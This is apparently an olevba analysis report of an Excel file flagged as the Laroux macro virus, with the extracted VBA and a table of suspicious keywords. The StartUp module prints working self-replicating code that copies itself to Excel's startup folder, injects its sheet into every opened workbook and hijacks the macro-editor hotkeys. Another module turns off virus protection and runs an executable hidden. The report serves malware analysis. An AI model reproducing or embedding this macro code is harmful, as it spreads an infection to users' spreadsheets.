olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
  IsDocSave = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Declare Function GetActiveWindow Lib "user32" () As Long

Public Win_Path             As String       'Window路径
Public Ini_Path             As String
Public DocIsReadonly        As Boolean      '标记文档只否只读
Public IsOaRun              As Boolean      '是否从OA打开
Public IsDocSave            As Boolean      '是否保存

Public Ini_LocalFileName    As String
Public Ini__LocalFileName   As String

Public Ini_AgentPath        As String
Public Ini__AgentPath       As String
Public Ini_UseAgentName     As String
Public Ini__UseAgentName    As String

Public Ini_AttachFileType   As String
Public Ini__AttachFileType  As String

Public Ini_DocUNID          As String
Public Ini__DocUNID         As String
Public Ini_DbName           As String
Public Ini__DbName          As String

Public Ini_ServerIP         As String
Public Ini__ServerIP        As String

Public Ini_HttpPassword     As String
Public Ini__HttpPassword    As String
Public Ini_UserName         As String
Public Ini__UserName        As String

Public Ini_FTP_USER         As String
Public Ini__FTP_USER        As String
Public Ini_FTP_PSW          As String
Public Ini__FTP_PSW         As String

Public Ini_Cn_UserName      As String
Public Ini__Cn_UserName     As String

Public Ini_FileUrl          As String
Public Ini__FileUrl         As String

Public Ini_AttachAuthor     As String
Public Ini__AttachAuthor    As String

Public Ini_Application      As String
Public Ini__Application     As String

Sub auto_open()
    Dim myBar           As CommandBar
    Dim mybarbut1       As CommandBarButton
    Dim mybarbut2       As CommandBarButton
    Dim mybarbut3       As CommandBarButton
    Dim mybarbut4       As CommandBarButton
    
    On Error Resume Next
    Win_Path = GetWin_Path()
    Ini_Path = Win_Path + "\WebInterface.ini"
   
    Set myBar = CommandBars("OA审批功能箱")  '查找以前的工具条，如果有将其删除
    If Not myBar Is Nothing Then myBar.Delete
        
     '---判断是否从OA打开，如果是本地打开不需读ini，为0，即看不到宏按钮
    If GetIniVar(Ini_Path, "Excel", "ExcelOpen") = "0" Then
        IsOaRun = False
        Exit Sub
    Else
        IsOaRun = True
        IsDocSave = True
        success = WritePrivateProfileString("Excel", "ExcelOpen", "0", Ini_Path)
    End If
   
   '---------end 2010-3-20
     '备份INI
    Ini_LocalFileName = GetIniVar(Ini_Path, "Interface", "LocalFileName")
    Ini_UseAgentName = GetIniVar(Ini_Path, "Interface", "UseAgentName")
    Ini_AttachFileType = GetIniVar(Ini_Path, "UploadField", "AttachFileType")
    Ini_AgentPath = GetIniVar(Ini_Path, "Interface", "AgentPath")
    Ini_DocUNID = GetIniVar(Ini_Path, "Interface", "DocUNID")
    Ini_DbName = GetIniVar(Ini_Path, "Interface", "DbName")
    Ini_ServerIP = GetIniVar(Ini_Path, "Interface", "ServerIP")
    Ini_HttpPassword = GetIniVar(Ini_Path, "Interface", "HttpPassword")
    Ini_UserName = GetIniVar(Ini_Path, "Interface", "UserName")
    Ini_FTP_USER = GetIniVar(Ini_Path, "Interface", "HTTP_UP_LOAD_USER")
    Ini_FTP_PSW = GetIniVar(Ini_Path, "Interface", "HTTP_UP_LOAD_PSW")
    Ini_Cn_UserName = GetIniVar(Ini_Path, "Interface", "CN_UserName")
    Ini_FileUrl = GetIniVar(Ini_Path, "Interface", "FileUrl")
    Ini_AttachAuthor = GetIniVar(Ini_Path, "Interface", "AttachAuthor")
    Ini_Application = GetIniVar(Ini_Path, "Interface", "Application")
    
    Options.VirusProtection = False  '关闭病毒检测
    
    '新建立一个工具条
    Set myBar = CommandBars.Add(Name:="OA审批功能箱", Position:=msoBarTop, Temporary:=True)
    With myBar
       If myBar.Controls.Count = 0 Then
          Set mybarbut1 = myBar.Controls.Add(Type:=msoControlButton)
          Set mybarbut2 = myBar.Controls.Add(Type:=msoControlButton)
          Set mybarbut3 = myBar.Controls.Add(Type:=msoControlButton)
          Set mybarbut4 = myBar.Controls.Add(Type:=msoControlButton)
          mybarbut1.Style = msoButtonIconAndCaption
          mybarbut1.Caption = "返回"
          mybarbut1.TooltipText = "关闭"
          mybarbut1.FaceId = 41
          mybarbut1.OnAction = "FileClose"
          mybarbut1.BeginGroup = True
          mybarbut2.Style = msoButtonIconAndCaption
          mybarbut2.Caption = "保存"
          mybarbut2.TooltipText = "将当前文件保存到OA中"
          mybarbut2.FaceId = 3
          mybarbut2.OnAction = "FileSave"
          mybarbut2.BeginGroup = True
          mybarbut3.Style = msoButtonIconAndCaption
          mybarbut3.Caption = "插入文件"
          mybarbut3.TooltipText = "在当前光标处插入文件"
          mybarbut3.FaceId = 271
          mybarbut3.OnAction = "File_YR"
          mybarbut3.BeginGroup = True
          mybarbut4.Style = msoButtonIconAndCaption
          mybarbut4.Caption = "打印"
          mybarbut4.TooltipText = "打印当前文档"
          mybarbut4.FaceId = 2521
          mybarbut4.OnAction = "FilePrint"
          mybarbut4.BeginGroup = True
       End If
    End With
    CommandBars("OA审批功能箱").Visible = True
   
    If GetIniVar(Ini_Path, "Interface", "IsReadOnly") = "Y" Then
        DocIsReadonly = True
        MsgBox "当前文件为只读文件，您现在对文件所做的任何修改都不予保存！", 0, "提示信息"
    End If
    
    If DocIsReadonly Or ActiveWorkbook.ReadOnly Then
        myBar.Controls(2).Visible = False
        myBar.Controls(3).Visible = False
    End If

    hwnd = GetActiveWindow()
    If hwnd <> 0 Then Call WritePrivateProfileString("Excel", "WebWindowHwnd", CStr(hwnd), Ini_Path)
    
    ActiveWorkbook.Saved = True
End Sub
Sub FileClose()
   If Application.Workbooks.Count > 1 Then
      ActiveWorkbook.Close
   Else
      Application.Quit
   End If
End Sub

Sub FileSave() '按钮保存
    On Error Resume Next
    ActiveWorkbook.Save
    ActiveWorkbook.Saved = True
    Call UploadFile(False)
    IsDocSave = True
End Sub


Sub Auto_Close()
    On Error Resume Next
    If DocIsReadonly Or ActiveWorkbook.ReadOnly Then Exit Sub   '当文件为只读时
    If Not (IsOaRun) Then Exit Sub                              '不是从OA中启动时退出
    
    If Not (ActiveWorkbook.Saved) Then
        answer = MsgBox("是否保存当前文档？", 3, "提示信息")
        Select Case answer
        Case 2
           Exit Sub
        Case 6
           Call ActiveWorkbook.Save
           If Not (UploadFile(True)) Then
              ActiveWorkbook.Saved = False
              Exit Sub
           End If
        Case 7
           If Not IsDocSave Then
              If Not (UploadFile(True)) Then
                 ActiveWorkbook.Saved = False
                 Exit Sub
              End If
           End If
        End Select
    ElseIf Not IsDocSave Then
        If Not (UploadFile(True)) Then
            ActiveWorkbook.Saved = False
            Exit Sub
        End If
    End If
    
    ActiveWorkbook.Saved = True
  
    Set myBar = CommandBars("OA审批功能箱")
    If Not myBar Is Nothing Then myBar.Delete
  
    IsOaRun = False
    
    Call WritePrivateProfileString("Excel", "WebWindowHwnd", "", Ini_Path)
    If Application.Workbooks.Count > 1 Then
        ActiveWorkbook.Close
    Else
        Application.Quit
    End If
End Sub


Function UploadFile(isCheckSuccess As Boolean) As Boolean   '将文件上传至服务器 'isCheckSuccess: true -- 检查是否上传成功,false -- 不检查直接返回
    On Error Resume Next
    UploadFile = False
    Call WritePrivateProfileString("Interface", "Action", "Upload", Ini_Path)

    If isCheckSuccess Then
        Call WritePrivateProfileString("Interface", "IsUnlock", "Y", Ini_Path)
        Call WritePrivateProfileString("Interface", "IsSuccess", "N", Ini_Path)
    Else
        Call WritePrivateProfileString("Interface", "IsUnlock", "N", Ini_Path)
    End If
    
     '备份
    Ini__LocalFileName = GetIniVar(Ini_Path, "Interface", "LocalFileName")
    Ini__UseAgentName = GetIniVar(Ini_Path, "Interface", "UseAgentName")
    Ini__AttachFileType = GetIniVar(Ini_Path, "UploadField", "AttachFileType")
    Ini__AgentPath = GetIniVar(Ini_Path, "Interface", "AgentPath")
    Ini__DocUNID = GetIniVar(Ini_Path, "Interface", "DocUNID")
    Ini__DbName = GetIniVar(Ini_Path, "Interface", "DbName")
    Ini__ServerIP = GetIniVar(Ini_Path, "Interface", "ServerIP")
    Ini__HttpPassword = GetIniVar(Ini_Path, "Interface", "HttpPassword")
    Ini__UserName = GetIniVar(Ini_Path, "Interface", "UserName")
    Ini__FTP_USER = GetIniVar(Ini_Path, "Interface", "HTTP_UP_LOAD_USER")
    Ini__FTP_PSW = GetIniVar(Ini_Path, "Interface", "HTTP_UP_LOAD_PSW")
    Ini__Cn_UserName = GetIniVar(Ini_Path, "Interface", "CN_UserName")
    Ini__FileUrl = GetIniVar(Ini_Path, "Interface", "FileUrl")
    Ini__AttachAuthor = GetIniVar(Ini_Path, "Interface", "AttachAuthor")
    Ini__Application = GetIniVar(Ini_Path, "Interface", "Application")
    
    Call WritePrivateProfileString("Interface", "LocalFileName", Ini_LocalFileName, Ini_Path)
    Call WritePrivateProfileString("Interface", "UseAgentName", Ini_UseAgentName, Ini_Path)
    Call WritePrivateProfileString("UploadField", "AttachFileType", Ini_AttachFileType, Ini_Path)
    Call WritePrivateProfileString("Interface", "AgentPath", Ini_AgentPath, Ini_Path)
    Call WritePrivateProfileString("Interface", "DocUNID", Ini_DocUNID, Ini_Path)
    Call WritePrivateProfileString("Interface", "DbName", Ini_DbName, Ini_Path)
    Call WritePrivateProfileString("Interface", "ServerIP", Ini_ServerIP, Ini_Path)
    Call WritePrivateProfileString("Interface", "HttpPassword", Ini_HttpPassword, Ini_Path)
    Call WritePrivateProfileString("Interface", "UserName", Ini_UserName, Ini_Path)
    Call WritePrivateProfileString("Interface", "HTTP_UP_LOAD_USER", Ini_FTP_USER, Ini_Path)
    Call WritePrivateProfileString("Interface", "HTTP_UP_LOAD_PSW", Ini_FTP_PSW, Ini_Path)
    Call WritePrivateProfileString("Interface", "CN_UserName", Ini_Cn_UserName, Ini_Path)
    Call WritePrivateProfileString("Interface", "FileUrl", Ini_FileUrl, Ini_Path)
    Call WritePrivateProfileString("Interface", "AttachAuthor", Ini_AttachAuthor, Ini_Path)
    Call WritePrivateProfileString("Interface", "Application", Ini_Application, Ini_Path)
    Call Shell(Win_Path + "\LtNetComm.exe", vbHide)
    
    Sleep (250)
    '恢复
    Call WritePrivateProfileString("Interface", "LocalFileName", Ini__LocalFileName, Ini_Path)
    Call WritePrivateProfileString("Interface", "UseAgentName", Ini__UseAgentName, Ini_Path)
    Call WritePrivateProfileString("UploadField", "AttachFileType", Ini__AttachFileType, Ini_Path)
    Call WritePrivateProfileString("Interface", "AgentPath", Ini__AgentPath, Ini_Path)
    Call WritePrivateProfileString("Interface", "DocUNID", Ini__DocUNID, Ini_Path)
    Call WritePrivateProfileString("Interface", "DbName", Ini__DbName, Ini_Path)
    Call WritePrivateProfileString("Interface", "ServerIP", Ini__ServerIP, Ini_Path)
    Call WritePrivateProfileString("Interface", "HttpPassword", Ini__HttpPassword, Ini_Path)
    Call WritePrivateProfileString("Interface", "UserName", Ini__UserName, Ini_Path)
    Call WritePrivateProfileString("Interface", "HTTP_UP_LOAD_USER", Ini__FTP_USER, Ini_Path)
    Call WritePrivateProfileString("Interface", "HTTP_UP_LOAD_PSW", Ini__FTP_PSW, Ini_Path)
    Call WritePrivateProfileString("Interface", "CN_UserName", Ini__Cn_UserName, Ini_Path)
    Call WritePrivateProfileString("Interface", "FileUrl", Ini__FileUrl, Ini_Path)
    Call WritePrivateProfileString("Interface", "AttachAuthor", Ini__AttachAuthor, Ini_Path)
    Call WritePrivateProfileString("Interface", "Application", Ini__Application, Ini_Path)
    
    If isCheckSuccess Then
        For i = 1 To 40
            If GetIniVar(Ini_Path, "Interface", "IsSuccess") = "Y" Then
                UploadFile = True
                Exit For
            Else
                Call Sleep(250)
            End If
        Next
    Else
        UploadFile = True
    End If
End Function

Public Sub File_YR()        '引入文件
    On Error Resume Next
    Application.Dialogs(xlDialogOpen).Show
    Sheets.Move before:=Workbooks(1).Sheets(1)
End Sub

Sub FilePrint()             ' 打印
    On Error Resume Next
    Application.Dialogs(xlDialogPrint).Show
End Sub


Function GetWin_Path() As String     '取Window目录的路径
    Dim a   As Integer
    Dim b   As String * 40

    a = GetWindowsDirectory(b, Len(b))
    GetWin_Path = Left(b, a)
End Function

Function GetIniVar(inifilename As String, mainkey As String, varname As String) As String
    Dim Str1      As String * 255
    Dim Len1      As Integer
    
    Len1 = GetPrivateProfileString(mainkey, varname, "", Str1, Len(Str1), inifilename)
    tmpstring = Str1
    GetIniVar = Trim(Left(tmpstring, InStr(1, tmpstring, Chr(0)) - 1))
End Function

-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.zc-dbe8202b6943da02cb49a88c9a7bbc5be6f77474 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").del
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub acop()
Attribute acop.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub aback()
Attribute aback.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!acop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ßbn
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ßb‰[’
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |LtNetComm.exe       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

